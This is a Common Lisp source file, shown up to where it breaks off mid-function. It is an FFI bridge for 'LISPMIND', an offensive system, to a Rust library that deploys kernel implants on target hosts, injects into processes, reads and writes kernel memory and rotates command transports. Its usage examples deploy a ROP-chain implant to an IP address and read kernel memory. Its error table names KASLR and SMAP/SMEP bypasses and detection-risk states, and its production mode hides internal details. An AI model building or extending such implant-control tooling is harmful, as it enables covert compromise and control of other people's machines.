;;;; -*- Mode: LISP; Syntax: ANSI-Common-Lisp; Base: 10; Package: LISPMIND -*-
;;;; ============================================================================
;;;; FILE: rust-ffi-bridge.lisp
;;;; MODULE: LISPMIND v2.5 — Rust FFI Bridge Layer
;;;; PURPOSE: SBCL sb-alien FFI bindings for liblispmind_core.so
;;;; AUTHOR: LISPMIND Autonomous Security Swarm
;;;; VERSION: 2.5.0
;;;; ============================================================================
;;;;
;;;; OVERVIEW
;;;; --------
;;;; This module provides the complete Lisp-side Foreign Function Interface (FFI)
;;;; bridge between the LISPMIND autonomous offensive security system (written in
;;;; Common Lisp, running on SBCL) and the core kernel implant engine (written in
;;;; Rust, compiled to a C-ABI shared library: liblispmind_core.so).
;;;;
;;;; The Rust core handles low-level operations that are unsafe or impossible to
;;;; perform directly from Lisp: kernel memory manipulation, process injection,
;;;; shared memory I/O, transport rotation, and implant lifecycle management.
;;;; This Lisp layer wraps every C function with:
;;;;
;;;;   - Automatic memory management (with-alien, with-ffi-memory)
;;;;   - Comprehensive input validation and bounds checking
;;;;   - Thread-safety via Bordeaux-Threads locks
;;;;   - Structured error handling with Lisp condition system
;;;;   - Graceful fallback to stub implementations when the library is unavailable
;;;;   - Full diagnostic and self-test capabilities
;;;;
;;;; ARCHITECTURE
;;;; ------------
;;;;
;;;;   +---------------------+        +-------------------------+
;;;;   | kernel-orchestrator |------->| rust-ffi-bridge.lisp    |
;;;;   | (this file's users) |        | (FFI wrapper functions) |
;;;;   +---------------------+        +-------------------------+
;;;;                                             |
;;;;                                             | sb-alien
;;;;                                             v
;;;;                                   +-------------------------+
;;;;                                   | liblispmind_core.so     |
;;;;                                   | (Rust compiled library) |
;;;;                                   +-------------------------+
;;;;                                             |
;;;;                                             | kernel syscalls
;;;;                                             v
;;;;                                   +-------------------------+
;;;;                                   | Linux Kernel            |
;;;;                                   | (target host memory)    |
;;;;                                   +-------------------------+
;;;;
;;;; C ABI CONTRACT
;;;; --------------
;;;; The shared library exports 7 functions with the following C signatures:
;;;;
;;;;   int deploy_implant(const char* binary_blob_id,
;;;;                      const char* target_host,
;;;;                      int target_pid,
;;;;                      uint64_t* out_implant_id,
;;;;                      uint64_t* out_memory_offset);
;;;;
;;;;   int check_health(uint64_t implant_id,
;;;;                    const char* target_host,
;;;;                    char* out_details,
;;;;                    uint64_t* out_uptime_seconds);
;;;;
;;;;   int unload_implant(uint64_t implant_id, const char* target_host);
;;;;
;;;;   int shared_memory_read(uint64_t implant_id,
;;;;                          uint64_t address,
;;;;                          uint8_t* out_buffer,
;;;;                          size_t buffer_size);
;;;;
;;;;   int shared_memory_write(uint64_t implant_id,
;;;;                           uint64_t address,
;;;;                           const uint8_t* data,
;;;;                           size_t data_len);
;;;;
;;;;   int get_implant_info(uint64_t implant_id,
;;;;                        char* out_type,
;;;;                        uint64_t* out_load_time,
;;;;                        int* out_hook_count);
;;;;
;;;;   int rotate_transport(uint64_t implant_id, const char* new_endpoint);
;;;;
;;;; SECURITY CONSIDERATIONS
;;;; -----------------------
;;;; 1. All foreign memory is allocated with WITH-ALIEN for automatic cleanup.
;;;; 2. String inputs are validated for length and null-byte safety before
;;;;    passing to C code.
;;;; 3. Buffer sizes are checked against maximums to prevent heap overflow.
;;;; 4. The FFI lock prevents concurrent access to the shared library.
;;;; 5. When the library is unavailable, all functions return safe stub values
;;;;    that prevent accidental operations.
;;;; 6. No sensitive data is logged in error messages (implant IDs are hashed
;;;;    in diagnostic output).
;;;; 7. All pointers are validated non-NIL before dereferencing in C.
;;;; 8. Timeout mechanisms prevent indefinite blocking on foreign calls.
;;;; 9. GC SAFETY: All Lisp strings and byte vectors passed to C are pinned
;;;;    using SB-SYS:WITH-PINNED-OBJECTS to prevent the garbage collector
;;;;    from moving them during foreign calls.  See WITH-PINNED-LISP-STRING
;;;;    and WITH-PINNED-BYTE-VECTOR macros in Section 2.5.
;;;; 10. CODE SIGNING: This file should be loaded from a signed tarball
;;;;     to prevent tampering.  Verify the signature before loading.
;;;;
;;;; THREAD SAFETY
;;;; -------------
;;;; All wrapper functions acquire *FFI-LOCK* before calling into the foreign
;;;; library. This ensures that:
;;;;   - Only one thread at a time makes C calls (the Rust library may not be
;;;;     thread-safe on its own)
;;;;   - Library reload operations are atomic w.r.t. active calls
;;;;   - State mutations (like *ffi-last-error*) are race-free
;;;;
;;;; ERROR HANDLING
;;;; --------------
;;;; C return codes are mapped to Lisp conditions:
;;;;   - Return code 0  → Success (wrapper returns useful value)
;;;;   - Return code >0 → Application-level error (mapped to plist with :error)
;;;;   - Return code <0 → System-level error (signalled as Lisp condition)
;;;;   - Library missing → Stub fallback (no error signalled)
;;;;   - Timeout → FFI-TIMEOUT condition signalled
;;;;   - Invalid args → FFI-INVALID-ARGUMENT condition signalled
;;;;
;;;; USAGE EXAMPLE
;;;; -------------
;;;;   ;; Initialize the FFI layer at system startup
;;;;   (rust-ffi-init)
;;;;
;;;;   ;; Deploy an implant
;;;;   (ffi-deploy-implant "rop-chain-v2" "192.168.1.100" 0)
;;;;   ;; => (:success t :implant-id 1743298456321 :memory-offset #x7FFE8000)
;;;;
;;;;   ;; Check health
;;;;   (ffi-check-health 1743298456321 "192.168.1.100")
;;;;   ;; => (:status :healthy :details "All systems nominal" :uptime 3600)
;;;;
;;;;   ;; Read kernel memory
;;;;   (ffi-read-memory 1743298456321 #xFFFFFFFF80000000 4096)
;;;;   ;; => #(0 0 0 0 ... 0)  -- byte vector of 4096 bytes
;;;;
;;;; DEPENDENCIES
;;;; ------------
;;;;   - SBCL (Steel Bank Common Lisp) with sb-alien
;;;;   - Bordeaux-Threads (for locking)
;;;;   - liblispmind_core.so (Rust compiled shared library)
;;;;   - Linux x86_64 target platform
;;;;
;;;; COMPATIBILITY
;;;; -------------
;;;;   - SBCL 2.0+ required for modern sb-alien features
;;;;   - Linux only (depends on ELF shared libraries)
;;;;   - x86_64 architecture assumed for uint64_t sizing
;;;;
;;;; LICENSE
;;;; -------
;;;; This file is part of the LISPMIND Autonomous Security Swarm.
;;;; Internal use only. Not for distribution.
;;;;
;;;; ============================================================================
;;;; CHANGELOG
;;;; ---------
;;;; 2.5.0  2024-06-01  Complete rewrite with full error handling, thread safety,
;;;;                    diagnostics, and stub fallback system.
;;;; 2.4.0  2024-03-15  Added rotate-transport FFI binding.
;;;; 2.3.0  2024-01-20  Added get-implant-info and shared-memory I/O.
;;;; 2.2.0  2023-11-10  Initial deploy/unload/health check bindings.
;;;; 2.1.0  2023-09-01  Stub definitions only, no real FFI.
;;;; ============================================================================

(in-package :lispmind)

;;;; ============================================================================
;;;; SECTION 1: SPECIAL VARIABLES AND CONFIGURATION
;;;; ============================================================================
;;;; All configurable and stateful variables for the FFI bridge.

(defparameter *rust-ffi-version* "2.5.0"
  "Version string of the Rust FFI bridge module.
   This follows semantic versioning: MAJOR.MINOR.PATCH.
   MAJOR changes indicate breaking API changes.
   MINOR changes indicate backward-compatible feature additions.
   PATCH changes indicate backward-compatible bug fixes.

   Example: (print *rust-ffi-version*) => \"2.5.0\"")

(defvar *rust-library-path* nil
  "Absolute or relative path to the liblispmind_core.so shared library.
   If NIL, the system will search standard locations.  If set to a string,
   that path is used directly.  The path may be changed at runtime before
   calling RUST-FFI-INIT or RUST-FFI-RELOAD.

   Example:
     (setf *rust-library-path* \"/opt/lispmind/lib/liblispmind_core.so\")
     (rust-ffi-init)

   Search order when NIL:
     1. Current working directory
     2. /usr/local/lib/lispmind/
     3. /opt/lispmind/lib/
     4. /usr/lib/lispmind/
     5. System LD_LIBRARY_PATH")

(defvar *kernel-rust-ffi-available-p* nil
  "Boolean flag indicating whether the Rust FFI library is loaded and ready.
   This is the canonical indicator used by kernel-orchestrator to decide
   whether to call real FFI functions or use stub fallbacks.

   Set to T by RUST-FFI-INIT on successful library load.
   Set to NIL by RUST-FFI-SHUTDOWN.
   Read-only for other modules — use RUST-FFI-AVAILABLE-P predicate.

   Example:
     (if *kernel-rust-ffi-available-p*
         (ffi-deploy-implant ...)
         (stub-deploy-implant ...))")

(defvar *rust-library-handle* nil
  "The alien shared-object handle returned by LOAD-SHARED-OBJECT.
   Stored for later unloading/reloading.  Internal use only.
   Do not manipulate directly — use RUST-FFI-SHUTDOWN instead.

   Type: sb-alien:shared-object or NIL")

(defvar *ffi-last-error* nil
  "Plist describing the most recent FFI error, if any.
   Format: (:code <integer> :description <string> :function <symbol> :timestamp <integer>)
   Reset to NIL on each successful FFI call.
   Used by diagnostic functions to report failure history.

   Example:
     (ffi-deploy-implant \"bad-id\" \"host\" 0)
     *ffi-last-error*
     ;; => (:code -5 :description \"Invalid binary blob ID\" :function ffi-deploy-implant :timestamp 1717286400)")

(defvar *ffi-call-timeout* 30
  "Maximum seconds to wait for any single FFI call to complete.
   If a call exceeds this timeout, an FFI-TIMEOUT condition is signalled.
   This prevents hung kernel operations from freezing the Lisp image.
   Default: 30 seconds.  Increase for slow network targets.

   Example:
     (let ((*ffi-call-timeout* 60))
       (ffi-read-memory ...))  ; 60-second timeout for large reads")

(defvar *ffi-max-string-length* 4096
  "Maximum allowed length for string arguments passed to C functions.
   Strings longer than this are rejected before reaching the FFI layer.
   This prevents excessive memory allocation and potential buffer issues.
   Default: 4096 characters.

   Applies to: binary-blob-id, target-host, new-endpoint, out-details buffers.")

(defvar *ffi-max-buffer-size* (* 16 1024 1024)
  "Maximum allowed size for memory read/write buffers in bytes.
   Read/write requests exceeding this size are rejected.
   Default: 16 MB.  This protects against accidental huge allocations.

   Example:
     (ffi-read-memory implant-id addr (* 32 1024 1024))  ; ERROR: exceeds max")

(defvar *ffi-default-buffer-size* 4096
  "Default buffer size for memory read operations when not specified.
   This is one page on x86_64 Linux.  Most kernel reads are small.
   Default: 4096 bytes.

   Example:
     (ffi-read-memory implant-id addr)  ; reads 4096 bytes")

(defvar *ffi-details-buffer-size* 256
  "Size of the output buffer for health check details string.
   Must match the C contract exactly.  The Rust side writes up to 255
   characters plus a NUL terminator into this buffer.
   Default: 256 bytes.

   WARNING: Changing this without updating the Rust side will cause
   buffer overflows or truncated messages.")

(defvar *ffi-type-buffer-size* 64
  "Size of the output buffer for implant type string.
   Must match the C contract.  The Rust side writes up to 63 characters
   plus a NUL terminator.
   Default: 64 bytes.")

(defvar *ffi-verbose* nil
  "When T, print diagnostic messages during FFI operations.
   Useful for debugging but should be NIL in production to avoid
   leaking sensitive information to logs.
   Default: NIL.")

(defvar *ffi-log-calls* nil
  "When T, log every FFI call with arguments (sanitized) to *TRACE-OUTPUT*.
   For security audit trails.  Implant IDs are logged but memory contents
   are never logged.
   Default: NIL.")

;;; --- Stub Confirmation State (Security Feature) ---

(defvar *ffi-stub-active-without-consent-p* nil
  "Set to T when the FFI falls back to stub mode due to library load failure.
   When this is T, wrapper functions will signal FFI-STUB-NOT-CONFIRMED
   instead of silently executing stubs.  The operator must explicitly
   confirm stub operation via CONFIRM-FFI-STUB-OPERATION.

   This prevents silent operational degradation where the system appears
   to work but is actually executing NO-OP stubs.
   Default: NIL.")

(defvar *ffi-stub-confirmed-p* nil
  "Set to T when the operator has explicitly confirmed stub operation.
   Once confirmed, wrapper functions will execute stub fallbacks normally.
   This is reset to NIL when the library is successfully loaded.
   Default: NIL.")

;;; --- Production Mode Error Sanitization ---

(defvar *ffi-production-mode-p* nil
  "When T, all FFI error messages are sanitized to generic descriptions.
   This prevents sensitive internal state from leaking through error
   messages in production deployments (e.g., memory addresses, kernel
   structures, implementation details).

   When NIL (debug mode), detailed error codes and descriptions are
   preserved for troubleshooting.

   Default: NIL (debug mode).  Set to T before deployment.

   Example:
     ;; In production initialization:
     (set-ffi-production-mode t)

     ;; Now error -5 returns \"operation failed\" instead of
     ;; \"failed to decrypt payload\" or similar internals.")

(defvar *ffi-production-error-table*
  (let ((table (make-hash-table :test 'eql)))
    ;; Map ALL internal error codes to 3 generic outcomes
    (dolist (code '(0 -1 -2 -3 -4 -5 -6 -7 -8 -9 -10 -11 -12 -13 -14
                    -15 -16 -17 -18 -19 -20 -21 -22 -23 -24 -25 -26
                    -27 -28 -29 -30 1 2))
      (setf (gethash code table)
            (cond
              ;; Retry-recommended codes
              ((member code '(-6 -14 -15 -28)) :generic-retry)
              ;; Resource-unavailable codes
              ((member code '(-2 -3 -8 -10 -13 -22 -23 -24 -30))
               :generic-unavailable)
              ;; Everything else → generic failure
              (t :generic-failure))))
    table)
  "Hash table mapping EVERY internal error code to one of three generic
   outcomes used in production mode:
     :generic-failure     — operation could not complete
     :generic-unavailable — resource temporarily unavailable
     :generic-retry       — operation should be retried later

   This ensures that no sensitive internal error details leak through
   error messages in production deployments.

   See also: SANITIZE-FFI-ERROR, *FFI-PRODUCTION-MODE-P*.")

;;;; ============================================================================
;;;; SECTION 2: THREAD SAFETY — LOCKING
;;;; ============================================================================
;;;; All shared library calls are serialized through a single lock.
;;;; This protects both the library handle and the last-error state.

(defvar *ffi-lock* (bt:make-lock "LISPMIND-FFI-Lock")
  "Bordeaux-Threads lock guarding all FFI operations.
   Acquired by every wrapper function before calling C code.
   This ensures:
     1. Thread-safe access to the shared library
     2. Atomic library reload/shutdown operations
     3. Race-free updates to *FFI-LAST-ERROR*

   The lock is recursive to allow diagnostic functions to call other
   FFI functions safely.

   Do not acquire directly — wrappers handle this automatically.")

(defmacro with-ffi-lock (&body body)
  "Execute BODY while holding *FFI-LOCK*.  All FFI wrapper functions
   use this macro to ensure serialized access to the shared library.

   If the lock cannot be acquired within *FFI-CALL-TIMEOUT* seconds,
   an FFI-TIMEOUT condition is signalled.

   Parameters: none
   Returns:    The primary value of the last form in BODY.
   Signals:    FFI-TIMEOUT if lock acquisition times out.

   Example:
     (with-ffi-lock
       (setf *ffi-last-error* nil)
       (deploy-implant-ffi ...))"
  `(bt:with-lock-held (*ffi-lock*)
     ,@body))

;;;; ============================================================================
;;;; SECTION 2.5: GC-SAFE PINNED OBJECT MACROS
;;;; ============================================================================
;;;; These macros ensure that Lisp strings and byte vectors are pinned
;;;; in memory before passing their addresses to C code.  Without pinning,
;;;; the SBCL garbage collector could move the objects during a foreign
;;;; call, causing the C code to read from or write to invalid memory.
;;;;
;;;; Usage: Wrap any FFI call that passes a Lisp string or byte vector:
;;;;   (with-pinned-lisp-string (ptr "hello")
;;;;     (some-c-function ptr))
;;;;
;;;;   (with-pinned-byte-vector (ptr my-bytes)
;;;;     (some-c-function ptr (length my-bytes)))

(defmacro with-pinned-lisp-string ((ptr-var lisp-string) &body body)
  "Pin LISP-STRING in memory and bind PTR-VAR to its SAP for C calls.

   Parameters:
     PTR-VAR      — Symbol to bind to the System Area Pointer (SAP).
     LISP-STRING  — Form evaluating to a string.  The string is pinned
                    for the duration of BODY.

   Returns:
     The primary value of the last form in BODY.

   Guarantees:
     - The string's bytes are pinned via SB-SYS:WITH-PINNED-OBJECTS.
     - PTR-VAR is bound to (SB-SYS:VECTOR-SAP (SB-EXT:STRING-TO-OCTETS ...)).
     - The octet vector is also pinned to prevent GC movement.

   Safety:
     - This macro must be used for EVERY FFI call that passes a string
       to C code.  Passing an unpinned string is a use-after-free bug.
     - The string is converted to UTF-8 octets before pinning.

   Example:
     (with-pinned-lisp-string (ptr \"target-host\")
       (deploy-implant-ffi ptr ...))"
  (let ((octet-vec (gensym "OCTETS-")))
    `(let ((,octet-vec (sb-ext:string-to-octets ,lisp-string)))
       (sb-sys:with-pinned-objects (,octet-vec)
         (let ((,ptr-var (sb-sys:vector-sap ,octet-vec)))
           ,@body)))))

(defmacro with-pinned-byte-vector ((ptr-var byte-vector) &body body)
  "Pin BYTE-VECTOR in memory and bind PTR-VAR to its SAP for C calls.

   Parameters:
     PTR-VAR     — Symbol to bind to the System Area Pointer (SAP).
     BYTE-VECTOR — Form evaluating to a (vector (unsigned-byte 8)).
                   The vector is pinned for the duration of BODY.

   Returns:
     The primary value of the last form in BODY.

   Guarantees:
     - The vector is pinned via SB-SYS:WITH-PINNED-OBJECTS.
     - PTR-VAR is bound to (SB-SYS:VECTOR-SAP byte-vector).

   Safety:
     - This macro must be used for EVERY FFI call that passes a byte
       vector to C code (shared-memory-write, shared-memory-read output).
     - Passing an unpinned vector is a use-after-free bug that can
       corrupt kernel memory or crash the Lisp image.

   Example:
     (with-pinned-byte-vector (ptr my-payload)
       (shared-memory-write-ffi implant-id addr ptr (length my-payload)))"
  `(sb-sys:with-pinned-objects (,byte-vector)
     (let ((,ptr-var (sb-sys:vector-sap ,byte-vector)))
       ,@body)))

;;;; ============================================================================
;;;; SECTION 3: CONDITIONS (ERROR HIERARCHY)
;;;; ============================================================================
;;;; Lisp condition types for FFI-level errors.  All inherit from
;;;; LISPMIND-ERROR (defined elsewhere) or stand alone if not available.

(define-condition ffi-error (error)
  ((function :initarg :function
             :reader ffi-error-function
             :documentation "The Lisp function that triggered the FFI error.")
   (code :initarg :code
         :reader ffi-error-code
         :initform nil
         :documentation "Numeric error code from C, if available.")
   (description :initarg :description
                :reader ffi-error-description
                :initform "Unknown FFI error"
                :documentation "Human-readable description of the error."))
  (:documentation "Base condition for all Rust FFI bridge errors.
    Signalled when the C library returns an error code or when
    pre-call validation fails.

    Slots:
      :function    — Symbol naming the Lisp wrapper function
      :code        — Integer error code (or NIL for validation errors)
      :description — Human-readable error string

    Example handler:
      (handler-case (ffi-deploy-implant ...)
        (ffi-error (e)
          (format t \"FFI call ~A failed: ~A (code ~D)~%\"
                  (ffi-error-function e)
                  (ffi-error-description e)
                  (ffi-error-code e))))"))

(define-condition ffi-library-error (ffi-error)
  ((library-path :initarg :library-path
                 :reader ffi-library-error-path
                 :initform nil
                 :documentation "Path to the library that failed to load."))
  (:documentation "Signalled when the shared library cannot be loaded.
    This is a fatal condition during initialization.

    Slots (inherited from FFI-ERROR plus):
      :library-path — The path that was attempted

    Recovery: Use stub fallback or call RUST-FFI-RELOAD with a different path."))

(define-condition ffi-invalid-argument (ffi-error)
  ((argument-name :initarg :argument-name
                  :reader ffi-invalid-argument-name
                  :initform nil
                  :documentation "Name of the invalid argument.")
   (argument-value :initarg :argument-value
                   :reader ffi-invalid-argument-value
                   :initform nil
                   :documentation "The value that failed validation."))
  (:documentation "Signalled when a wrapper function receives invalid arguments
    before the FFI call is made.  This catches errors on the Lisp side
    without ever calling C code.

    Slots (inherited from FFI-ERROR plus):
      :argument-name  — Symbol naming the bad argument (e.g., 'target-host)
      :argument-value — The actual value received

    Example:
      (handler-case (ffi-deploy-implant \"id\" 123 0)  ; 123 is not a string
        (ffi-invalid-argument (e)
          (format t \"Bad ~A: ~S~%\" (ffi-invalid-argument-name e)
                                 (ffi-invalid-argument-value e))))"))

(define-condition ffi-timeout (ffi-error)
  ((timeout-seconds :initarg :timeout-seconds
                    :reader ffi-timeout-seconds
                    :initform *ffi-call-timeout*
                    :documentation "The timeout value that was exceeded."))
  (:documentation "Signalled when an FFI call exceeds *FFI-CALL-TIMEOUT*.
    This prevents the Lisp image from hanging indefinitely on stuck
    kernel operations.

    Slots (inherited from FFI-ERROR plus):
      :timeout-seconds — Number of seconds waited before timeout

    Recovery: Retry with a longer timeout, or check target host connectivity."))

(define-condition ffi-buffer-overflow (ffi-error)
  ((requested-size :initarg :requested-size
                   :reader ffi-buffer-overflow-requested
                   :initform 0)
   (maximum-size :initarg :maximum-size
                 :reader ffi-buffer-overflow-maximum
                 :initform *ffi-max-buffer-size*))
  (:documentation "Signalled when a buffer allocation request exceeds
    the safety maximum.  Prevents accidental huge memory allocations.

    Slots:
      :requested-size — The size that was requested
      :maximum-size   — The configured maximum allowed"))

(define-condition ffi-stub-not-confirmed (ffi-error)
  ((stub-function :initarg :stub-function
                  :reader ffi-stub-not-confirmed-function
                  :initform nil
                  :documentation "The wrapper function that was called while stub mode was unconfirmed."))
  (:documentation "Signalled when a wrapper function is called while the FFI
    is in stub fallback mode and the operator has not explicitly confirmed
    that stub operation is acceptable.

    This is a SAFETY feature — silent stub fallbacks can mask serious
    operational issues.  The operator must call CONFIRM-FFI-STUB-OPERATION
    or FFI-STUB-FORCE-CONFIRM before stub functions will execute.

    Slots (inherited from FFI-ERROR plus):
      :stub-function — Symbol naming the function that triggered this condition

    Recovery:
      1. Call (confirm-ffi-stub-operation) for interactive confirmation.
      2. Call (ffi-stub-force-confirm) for automated deployments."))

;;;; ============================================================================
;;;; SECTION 4: ERROR CODE MAPPING
;;;; ============================================================================
;;;; Hash table mapping C error codes to human-readable descriptions.
;;;; Negative codes are system errors, positive codes are application errors.

(defvar *ffi-error-table*
  (let ((table (make-hash-table :test 'eql)))
    ;; System-level errors (negative)
    (setf (gethash 0 table)   "Success")
    (setf (gethash -1 table)  "Generic system error")
    (setf (gethash -2 table)  "Permission denied — insufficient privileges")
    (setf (gethash -3 table)  "Memory allocation failed in Rust core")
    (setf (gethash -4 table)  "Invalid argument passed to C function")
    (setf (gethash -5 table)  "Invalid binary blob ID — not found in registry")
    (setf (gethash -6 table)  "Target host unreachable or connection refused")
    (setf (gethash -7 table)  "Process injection failed — target PID not found")
    (setf (gethash -8 table)  "Kernel module load failed — incompatible kernel version")
    (setf (gethash -9 table)  "Symbol resolution failed in target kernel")
    (setf (gethash -10 table) "Shared memory region not found or inaccessible")
    (setf (gethash -11 table) "Read operation failed — invalid address or permissions")
    (setf (gethash -12 table) "Write operation failed — read-only or protected memory")
    (setf (gethash -13 table) "Implant not found — invalid implant ID")
    (setf (gethash -14 table) "Transport rotation failed — endpoint unreachable")
    (setf (gethash -15 table) "Timeout waiting for kernel operation")
    (setf (gethash -16 table) "Concurrent modification detected")
    (setf (gethash -17 table) "Library internal error — check Rust logs")
    (setf (gethash -18 table) "Buffer too small for output data")
    (setf (gethash -19 table) "String encoding error — invalid UTF-8")
    (setf (gethash -20 table) "Implant already exists for this target")
    (setf (gethash -21 table) "Kernel panic hook already claimed")
    (setf (gethash -22 table) "Network namespace isolation failed")
    (setf (gethash -23 table) "SELinux/AppArmor denial")
    (setf (gethash -24 table) "Secure Boot prevents unsigned module loading")
    (setf (gethash -25 table) "KASLR slide computation failed")
    (setf (gethash -26 table) "SMAP/SMEP bypass required but unavailable")
    (setf (gethash -27 table) "Target architecture mismatch")
    (setf (gethash -28 table) "Communication channel corrupted")
    (setf (gethash -29 table) "Implant self-destructed (tamper detection)")
    (setf (gethash -30 table) "Out of kernel memory for implant structures")
    ;; Application-level status codes (positive, from check_health)
    (setf (gethash 1 table)   "Implant degraded — non-critical subsystem failure")
    (setf (gethash 2 table)   "Implant critical — imminent failure or detection risk")
    table)
  "Hash table mapping integer error/status codes to human-readable strings.
   Populated with all known error codes from liblispmind_core.
   Unknown codes return a generic message.

   Usage:
     (ffi-error-code→string -5) => \"Invalid binary blob ID — not found in registry\"
     (ffi-error-code→string 999) => \"Unknown error code 999\"")

(defun ffi-error-code→string (code)
  "Convert a C error/status CODE to a human-readable description string.

   Parameters:
     CODE — Integer error code from a C function return value.

   Returns:
     String description from *FFI-ERROR-TABLE*, or a generic message
     if the code is not recognized.

   Examples:
     (ffi-error-code→string 0)    => \"Success\"
     (ffi-error-code→string -5)   => \"Invalid binary blob ID — not found in registry\"
     (ffi-error-code→string -999) => \"Unknown error code -999\"
     (ffi-error-code→string 2)    => \"Implant critical — imminent failure or detection risk\""
  (or (gethash code *ffi-error-table*)
      (format nil "Unknown error code ~D" code)))

(defun sanitize-ffi-error (code &optional description)
  "Sanitize an FFI error CODE and DESCRIPTION for production safety.

   Parameters:
     CODE        — Integer error code from a C function.
     DESCRIPTION — Optional string description (used in debug mode).

   Returns:
     A plist with sanitized keys:
       In production mode (*FFI-PRODUCTION-MODE-P* is T):
         (:generic-code <keyword> :message <generic-string>)
       In debug mode (*FFI-PRODUCTION-MODE-P* is NIL):
         (:code <int> :description <detailed-string>)

   Generic codes (production):
     :generic-failure     → \"operation failed\"
     :generic-unavailable → \"resource unavailable\"
     :generic-retry       → \"communication error, retry later\"

   Security guarantee:
     In production mode, NO internal error details are ever exposed.
     Messages like \"failed to decrypt payload\", \"invalid implant
     signature\", or \"kernel memory denied at 0xFFFF...\" are never
     returned.  Only the three generic messages above.

   Example:
     (let ((*ffi-production-mode-p* t))
       (sanitize-ffi-error -5))
     ;; => (:generic-code :generic-failure :message \"operation failed\")

     (let ((*ffi-production-mode-p* nil))
       (sanitize-ffi-error -5))
     ;; => (:code -5 :description \"Invalid binary blob ID\")"
  (if *ffi-production-mode-p*
      ;; Production: map to generic codes only
      (let ((generic-code (or (gethash code *ffi-production-error-table*)
                              :generic-failure)))
        (list :generic-code generic-code
              :message (case generic-code
                         (:generic-failure "operation failed")
                         (:generic-unavailable "resource unavailable")
                         (:generic-retry "communication error, retry later")
                         (t "operation failed"))))
      ;; Debug: preserve detailed codes
      (list :code code
            :description (or description (ffi-error-code→string code)))))

(defun set-ffi-production-mode (enabled-p)
  "Toggle FFI production mode on or off.

   Parameters:
     ENABLED-P — T to enable production mode (sanitized errors),
                 NIL to enable debug mode (detailed errors).

   Returns:
     The new value of *FFI-PRODUCTION-MODE-P*.

   Side effects:
     Sets *FFI-PRODUCTION-MODE-P* to ENABLED-P.

   Security:
     This should be called ONCE during system initialization, before
     any FFI operations.  Toggling at runtime is supported but not
     recommended as it could create inconsistent error reporting.

   Example:
     ;; Production deployment — sanitize all errors
     (set-ffi-production-mode t)

     ;; Development — detailed error messages for debugging
     (set-ffi-production-mode nil)"
  (setf *ffi-production-mode-p* (not (null enabled-p)))
  (when *ffi-verbose*
    (format *trace-output* "~&[set-ffi-production-mode] ~A~%"
            (if *ffi-production-mode-p*
                "Production mode ENABLED — errors will be sanitized"
                "Debug mode ENABLED — detailed errors preserved")))
  *ffi-production-mode-p*)

;;;; ============================================================================
;;;; SECTION 5: LIBRARY MANAGEMENT
;;;; ============================================================================
;;;; Functions for loading, unloading, reloading, and locating the shared
;;;; library.  These manage *RUST-LIBRARY-HANDLE* and
;;;; *KERNEL-RUST-FFI-AVAILABLE-P*.

(defun find-library-path (&optional (hint *rust-library-path*))
  "Search for liblispmind_core.so in standard locations.

   Parameters:
     HINT — If provided and the file exists, use this path directly.
            If NIL, search standard locations.

   Returns:
     Absolute pathname string if found, NIL if not found anywhere.

   Search order (when HINT is NIL):
     1. ./liblispmind_core.so  (current directory)
     2. /usr/local/lib/lispmind/liblispmind_core.so
     3. /opt/lispmind/lib/liblispmind_core.so
     4. /usr/lib/lispmind/liblispmind_core.so
     5. $LD_LIBRARY_PATH/lispmind_core.so (first match)

   Examples:
     (find-library-path)                              ; search all locations
     (find-library-path \"/custom/path/lib.so\")      ; check specific path
     (find-library-path nil)                          ; same as no argument"
  ;; If a hint is provided, validate it first
  (when (and hint (stringp hint) (plusp (length hint)))
    (when (probe-file hint)
      (return-from find-library-path (namestring (truename hint)))))
  ;; Search standard locations
  (let ((candidates
          (list "liblispmind_core.so"
                "/usr/local/lib/lispmind/liblispmind_core.so"
                "/opt/lispmind/lib/liblispmind_core.so"
                "/usr/lib/lispmind/liblispmind_core.so")))
    ;; Check each candidate
    (dolist (candidate candidates)
      (when (probe-file candidate)
        (return-from find-library-path (namestring (truename candidate)))))
    ;; Check LD_LIBRARY_PATH
    (let ((ld-path (uiop:getenv "LD_LIBRARY_PATH")))
      (when ld-path
        (dolist (dir (uiop:split-string ld-path :separator #\:))
          (let ((full-path (merge-pathnames
                            (make-pathname :name "liblispmind_core"
                                           :type "so")
                            (pathname (ensure-directory-pathname dir)))))
            (when (probe-file full-path)
              (return-from find-library-path (namestring (truename full-path))))))))
    ;; Not found anywhere
    nil))

(defun rust-ffi-available-p ()
  "Predicate: is the Rust FFI library loaded and available?

   Returns:
     T if *KERNEL-RUST-FFI-AVAILABLE-P* is true and the library handle
     is valid (non-NIL).
     NIL otherwise.

   This is the recommended way to check FFI availability rather than
   reading the special variable directly.

   Example:
     (when (rust-ffi-available-p)
       (ffi-deploy-implant ...))"
  (and *kernel-rust-ffi-available-p*
       *rust-library-handle*))

(defun rust-ffi-init (&key (library-path *rust-library-path*) verbose)
  "Initialize the Rust FFI bridge by loading liblispmind_core.so.

   Parameters:
     :library-path — Override path to the shared library.  If NIL, search
                     standard locations via FIND-LIBRARY-PATH.
     :verbose      — When T, print status messages to *TRACE-OUTPUT*.

   Returns:
     T on successful initialization, NIL on failure.

   Side effects:
     - Sets *RUST-LIBRARY-HANDLE* to the loaded shared object
     - Sets *KERNEL-RUST-FFI-AVAILABLE-P* to T on success, NIL on failure
     - Resets *FFI-LAST-ERROR* to NIL
     - If already initialized, shuts down first then reloads

   Safety:
     - Thread-safe (acquires *FFI-LOCK*)
     - On failure, leaves the system in a clean state with stubs available
     - Does NOT signal conditions — returns NIL and sets *FFI-LAST-ERROR*

   Example:
     ;; Auto-detect library location
     (rust-ffi-init)

     ;; Use explicit path
     (rust-ffi-init :library-path \"/opt/lispmind/lib/liblispmind_core.so\")

     ;; Verbose initialization
     (rust-ffi-init :verbose t)"
  (with-ffi-lock
    (when verbose
      (format *trace-output* "~&[rust-ffi-init] LISPMIND FFI v~A initializing...~%"
              *rust-ffi-version*))
    ;; If already loaded, shut down first
    (when *rust-library-handle*
      (when verbose
        (format *trace-output* "[rust-ffi-init] Already loaded, shutting down first.~%"))
      (rust-ffi-shutdown))
    ;; Find the library
    (let ((path (or library-path (find-library-path))))
      (unless path
        (setf *ffi-last-error* (list :code -1
                                     :description "liblispmind_core.so not found in any search path"
                                     :function 'rust-ffi-init
                                     :timestamp (get-universal-time)))
        (when verbose
          (format *trace-output* "[rust-ffi-init] ERROR: Library not found.~%"))
        (return-from rust-ffi-init nil))
      ;; Attempt to load
      (handler-case
          (let ((handle (sb-alien:load-shared-object path)))
            (setf *rust-library-handle* handle)
            (setf *kernel-rust-ffi-available-p* t)
            ;; On successful load, reset stub confirmation state
